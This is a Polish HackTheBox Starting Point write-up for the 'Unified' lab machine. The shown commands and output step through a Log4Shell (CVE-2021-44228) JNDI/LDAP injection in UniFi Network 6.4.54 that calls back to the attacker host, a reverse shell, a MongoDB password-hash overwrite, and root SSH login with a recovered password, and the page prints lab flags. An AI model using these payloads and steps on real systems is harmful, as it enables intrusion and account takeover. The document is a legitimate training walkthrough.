---
title: "HackTheBox - Unified (Starting Point)"
date: "2025-11-21"
excerpt: "Eksploatacja Log4Shell (CVE-2021-44228) w UniFi Network 6.4.54 oraz przejęcie instancji przez MongoDB i panel UniFi."
platform: "HackTheBox"
difficulty: "Bardzo Łatwa"
solveTime: "2h 05min"
---

## Narzędzia/techniki

- Network:
  - `nmap` (pełny skan portów, serwis/wersja)
  - `curl` (HTTP/HTTPS requesty, wstrzyknięcie JNDI)
  - `tcpdump` (potwierdzenie callbacku JNDI/LDAP)
- Web / exploit:
  - UniFi Network Web UI (port 8443)
  - analiza CVE-2021-44228 (Log4Shell)
  - exploit z GitHuba: `puzzlepeaches/Log4jUnifi`
  - `python3` (venv), `pip`, `mvn`, RogueJNDI
- Post-exploitation:
  - `mongo` (MongoDB shell na porcie 27117)
  - `openssl passwd -6` (generowanie hashy SHA512-crypt)
  - `nc` (reverse shell listener)
  - `ssh` (dostęp jako root)
- Techniki:
  - Log4Shell (JNDI injection, LDAP)
  - enumeracja i modyfikacja danych w MongoDB (DB `ace`, kolekcja `admin`)
  - pozyskanie poświadczeń roota przez panel UniFi ("Device / SSH Authentication")

## Podsumowanie

Eksploatacja maszyny Unified opiera się na podatnym UniFi Network 6.4.54: Log4Shell (CVE-2021-44228) daje reverse shell jako `unifi`, następnie przez MongoDB modyfikujemy konto administratora w panelu UniFi, z którego odczytujemy hasło roota do SSH i kończymy pełną kompromitacją systemu.

---

## 1. Skan portów

### Komenda

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ nmap -Pn -sS -p- --min-rate 2000 -T4 10.129.23.138

PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
8843/tcp open  unknown
8880/tcp open  cddbp-alt
```

### Kluczowe odkrycie

- Pierwsze cztery otwarte porty (Task 1): **22, 6789, 8080, 8443**
- Interesujące:
  - 22/tcp – SSH
  - 8080 / 8443 – typowe dla UniFi
  - 6789 – później potwierdzone jako `unifi.throughput.port` w konfiguracji

![1_portscan_nmap](/images/writeups/htb-unified/1_portscan_nmap.jpg "Pełny skan portów nmap")

---

## 2. Rekonesans HTTP(S) i identyfikacja podatności

### 2.1. Skan wersji na porcie 8443

#### Komenda

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ nmap -Pn -sC -sV -p 8443 10.129.23.138

PORT     STATE SERVICE         VERSION
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
```

### Kluczowe odkrycie

- Tytuł aplikacji na 8443 (Task 2): **UniFi Network**
- Cert i `http-title` jednoznacznie wskazują na UniFi Controller/Network.

![2_nmap_8443](/images/writeups/htb-unified/2_nmap_8443.jpg "Skan wersji usługi na porcie 8443")

### 2.2. Panel UniFi w przeglądarce

- URL: `https://10.129.23.138:8443/manage/account/login?redirect=%2Fmanage`
- Po zaakceptowaniu self-signed certu pojawia się ekran logowania UniFi Network.
- W UI nad formularzem widnieje wersja (Task 3): **6.4.54**

![3_https_8443_login](/images/writeups/htb-unified/3_https_8443_login.jpg "Panel logowania UniFi Network 6.4.54")

### 2.3. Research podatności (Log4Shell)

Szukane frazy:

- `UniFi Network 6.4.54 CVE`
- `unifi log4j exploit`

Znalezione m.in.:

- Advisory: `https://censys.com/blog/cve-2021-44228-log4j`

**Kluczowe:**

- Wersja UniFi 6.4.54 jest podatna na **CVE-2021-44228 (Log4Shell)** → Task 4.
- Exploit wykorzystuje pole `remember` w `/api/login`:
  - `{"username":"a","password":"a","remember":"${jndi:ldap://...}", "strict":true}`
- JNDI używa **LDAP** (Task 5).

![4_research_unifi_cve](/images/writeups/htb-unified/4_research_unifi_cve.jpg "Research CVE-2021-44228 dla UniFi 6.4.54")

Dodatkowy fragment POC/analizy exploitation `/api/login`:

![5_exploitation](/images/writeups/htb-unified/5_exploitation.jpg "Fragment opisu exploitation pola remember w /api/login")

---

## 3. Potwierdzenie Log4Shell (JNDI/LDAP) i exploit Log4jUnifi

### 3.1. Potwierdzenie callbacku LDAP (Task 6, 7)

Listener:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo tcpdump -i tun0 port 1389
tcpdump: verbose output suppressed, use -v[v]...
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:11:17.143005 IP 10.129.23.138.42700 > 10.10.14.60.1389: Flags [S], ...
06:11:17.143016 IP 10.10.14.60.1389 > 10.129.23.138.42700: Flags [R.], ...
```

Request z payloadem JNDI:

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ curl -i -s -k -X POST \
  -H 'Host: 10.129.23.138:8443' \
  -H 'Content-Type: application/json; charset=utf-8' \
  --data-binary "{\"username\":\"a\",\"password\":\"a\",\"remember\":\"\${jndi:ldap://10.10.14.60:1389/a}\",\"strict\":true}" \
  "https://10.129.23.138:8443/api/login"

HTTP/1.1 400 
...
{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}
```

- `tcpdump` → odpowiedź na Task 6 (narzędzie do przechwytywania ruchu).
- Protokół JNDI → LDAP (Task 5), domyślny port teoretycznie **389** (Task 7).

![6_curl_login_payload](/images/writeups/htb-unified/6_curl_login_payload.jpg "curl z payloadem JNDI i tcpdump pokazujący callback LDAP")

### 3.2. Repo exploita Log4jUnifi

Klonowanie i przygotowanie:

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi

┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ python3 -m venv venv
┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ source venv/bin/activate
(venv) ┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ pip install -r requirements.txt

(venv) ┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ sudo apt install -y openjdk-11-jre maven

(venv) ┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ mvn package -f utils/rogue-jndi/
[INFO] BUILD SUCCESS
```

![7_github_exploit](/images/writeups/htb-unified/7_github_exploit.jpg "Repozytorium GitHub: puzzlepeaches/Log4jUnifi")

Help exploita:

```bash
(venv) ┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ python exploit.py -h
usage: exploit.py [-h] -u URL -i CALLBACK -p PORT

options:
  -u, --url URL      Unifi Network Manager base URL
  -i, --ip CALLBACK  Callback IP for payload delivery and reverse shell.
  -p, --port PORT    Callback port for reverse shell.
```

### 3.3. Reverse shell przez exploit

Listener:

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Exploit:

```bash
(venv) ┌──(kali㉿kali)-[~/Desktop/hack the box/unified/Log4jUnifi]
└─$ python exploit.py -u https://10.129.23.138:8443 -i 10.10.14.60 -p 4444
[*] Starting malicous JNDI Server
{"username": "${jndi:ldap://10.10.14.60:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.14.60:1389/o=tomcat}", "strict":true}
[*] Firing payload!
[*] Check for a callback!
```

Na listenerze:

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.23.138] 46960
whoami
unifi
hostname
unified
id
uid=999(unifi) gid=999(unifi) groups=999(unifi)
pwd
/usr/lib/unifi
```

![8_reverse_shell](/images/writeups/htb-unified/8_reverse_shell.jpg "Reverse shell jako użytkownik unifi po exploicie Log4jUnifi")

---

## 4. MongoDB UniFi – port, baza, admini, modyfikacja

### 4.1. Port MongoDB (Task 8)

Sprawdzenie procesu:

```bash
unifi@unified:/usr/lib/unifi$ ps aux | grep -i mongo
unifi         69  ... bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 ...
```

- Port MongoDB (Task 8): **27117**

### 4.2. Konfiguracja system.properties

```bash
unifi@unified:/usr/lib/unifi$ cd /usr/lib/unifi/data
unifi@unified:/usr/lib/unifi/data$ cat system.properties
## controller UI / API
# unifi.https.port=8443
...
## local-bound port for DB server
# unifi.db.port=27117
...
# unifi.throughput.port=6789
...
```

![9_system_properties](/images/writeups/htb-unified/9_system_properties.jpg "Plik system.properties z konfiguracją portów UniFi")

### 4.3. Połączenie do Mongo i enumeracja DB (Task 9)

```bash
unifi@unified:/usr/lib/unifi$ mongo --port 27117
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
> show dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
```

- Domyślna baza UniFi (Task 9): **`ace`**

Przełączenie i kolekcje:

```javascript
> use ace
switched to db ace
> show collections
account
admin
...
user
...
```

### 4.4. Enumeracja adminów (Task 10) i analiza

```javascript
> db.admin.find(
  {},
  { name: 1, email: 1, x_shadow: 1, requires_new_password: 1 }
)
{ "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$...", "requires_new_password" : false }
{ "name" : "michael", "email" : "michael@unified.htb", "x_shadow" : "$6$spHwHYVF$...", "requires_new_password" : false }
{ "name" : "Seamus", "email" : "seamus@unified.htb", "x_shadow" : "$6$NT.hcX..$...", "requires_new_password" : true }
{ "name" : "warren", "email" : "warren@unified.htb", "x_shadow" : "$6$DDOzp/8g$...", "requires_new_password" : true }
{ "name" : "james", "email" : "james@unfiied.htb", "x_shadow" : "$6$ON/tM.23$...", "requires_new_password" : false }
```

- Funkcja do enumeracji użytkowników (Task 10): **`find()`**, np. `db.admin.find()`.

![10_mongo_admin_find](/images/writeups/htb-unified/10_mongo_admin_find.jpg "Enumeracja kolekcji admin w bazie ace")

Dostępne metody (esencja):

```javascript
> db.admin.help()
...
db.admin.update( query, object[, upsert_bool, multi_bool] )
db.admin.updateOne( filter, update, <optional params> )
db.admin.updateMany( filter, update, <optional params> )
...
```

- Funkcja do aktualizacji użytkowników (Task 11): **`db.admin.update()`** (lub `updateOne`, `updateMany`).

### 4.5. Generacja nowego hasha SHA512-crypt

Na Kali:

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ openssl passwd -6 '12345'
$6$rUb7pYZ7fOwb6wLS$DVFRFCChM.Olm/RcyTSn37fY6bZ0N6LTLCv4tGoDF1aKOLGI8pYh5F4cIVX0yrRhhSgenlZ1szAGcUFxGai7D1
```

### 4.6. Update hasła administratora w Mongo

```javascript
> use ace
switched to db ace

> db.admin.update(
  { name: "administrator" },
  {
    $set: {
      x_shadow: "$6$rUb7pYZ7fOwb6wLS$DVFRFCChM.Olm/RcyTSn37fY6bZ0N6LTLCv4tGoDF1aKOLGI8pYh5F4cIVX0yrRhhSgenlZ1szAGcUFxGai7D1",
      requires_new_password: false
    }
  }
)
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

> db.admin.find(
  { name: "administrator" },
  { name: 1, email: 1, x_shadow: 1, requires_new_password: 1 }
)
{ "name" : "administrator", "email" : "administrator@unified.htb",
  "x_shadow" : "$6$rUb7pYZ7fOwb6wLS$DVFRFCChM.Olm/RcyTSn37fY6bZ0N6LTLCv4tGoDF1aKOLGI8pYh5F4cIVX0yrRhhSgenlZ1szAGcUFxGai7D1",
  "requires_new_password" : false }
```

![11_mongo_admin_update](/images/writeups/htb-unified/11_mongo_admin_update.jpg "Modyfikacja hash'a konta administrator w kolekcji admin")

---

## 5. Przejęcie panelu UniFi i pozyskanie hasła roota (Task 12)

### 5.1. Logowanie do panelu UniFi

- URL: `https://10.129.23.138:8443/manage/account/login?redirect=%2Fmanage`
- Dane logowania:
  - Username: `administrator`
  - Password: `12345` (nasze nowe hasło)

![12_unifi_logged_in](/images/writeups/htb-unified/12_unifi_logged_in.jpg "Panel UniFi po zalogowaniu jako administrator")

### 5.2. Ustawienia Device / SSH Authentication = hasło roota

W panelu:

- `Settings` → `Site`
- Sekcja **Device Authentication** → **SSH Authentication**

Zawiera:

- **SSH Username:** `root`
- **SSH Password:** `NotACrackablePassword4U2022`

To jest odpowiedź na **Task 12** (hasło użytkownika root).

![13_root_passwd](/images/writeups/htb-unified/13_root_passwd.jpg "Ustawienia Device/SSH Authentication z hasłem roota")

---

## 6. Root shell + flagi

### 6.1. SSH jako root

```bash
┌──(kali㉿kali)-[~/Desktop/hack the box/unified]
└─$ ssh root@10.129.23.138
root@10.129.23.138's password: NotACrackablePassword4U2022

root@unified:~# whoami
root
root@unified:~# hostname
unified
root@unified:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![14_root_ssh](/images/writeups/htb-unified/14_root_ssh.jpg "Zalogowany root przez SSH z hasłem z panelu UniFi")

### 6.2. User flag

W reverse shellu jako `unifi`:

```bash
unifi@unified:/home$ ls
michael
unifi@unified:/home$ ls -la /home/michael
...
-rw-r--r-- 1 michael michael 33 Nov 21 12:xx user.txt
unifi@unified:/home/michael$ cat user.txt
6ced1a6a89e666c0620cdb10262ba127
```

- **User flag:** `6ced1a6a89e666c0620cdb10262ba127`

### 6.3. Root flag

Jako root po SSH:

```bash
root@unified:~# ls -la
...
-rw------- 1 root root 33 Nov 21 12:xx root.txt
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
```

- **Root flag:** `e50bc93c75b634e4b272d2f771c33681`

[tu wstaw screenshot] – np. `15_root_flag.jpg` jeśli go zrobisz:

```md
![15_root_flag](/images/writeups/htb-unified/15_root_flag.jpg "Odczyt root.txt jako root")
```

---

## Wnioski / czego się nauczyłem

- **Log4Shell (CVE-2021-44228) w realnej aplikacji**:
  - identyfikacja wersji UniFi (6.4.54) i powiązanego CVE,
  - potwierdzenie podatności przez callback LDAP (payload JNDI + `tcpdump`),
  - użycie gotowego exploita (`Log4jUnifi`) + RogueJNDI do uzyskania reverse shella.
- **MongoDB jako wektor post-exploitation**:
  - lokalny mongod na porcie 27117 (widziany w `ps aux` i `system.properties`),
  - domyślna baza `ace` (Task 9),
  - kolekcja `admin` jako źródło kont panelu UniFi:
    - enumeracja: `db.admin.find()` (Task 10),
    - modyfikacja: `db.admin.update()` (Task 11),
  - nadpisanie `x_shadow` (SHA512-crypt) wygenerowanym przez `openssl passwd -6`.
- **Powołanie się na panel do eskalacji**:
  - panel UniFi (`Settings → Site → Device Authentication`) przechowuje **poświadczenia SSH (root)**,
  - odczytanie tych danych daje natychmiastowy SSH root i root flag.
- Dobre praktyki:
  - praca krokowo: recon → exploit → shell → DB → panel → root,
  - dokładne notowanie komend z Twoim promptem (`┌──(kali㉿kali)`) + spójne nazwy screenshotów ułatwiają szybkie przeniesienie writeupa do Notion.

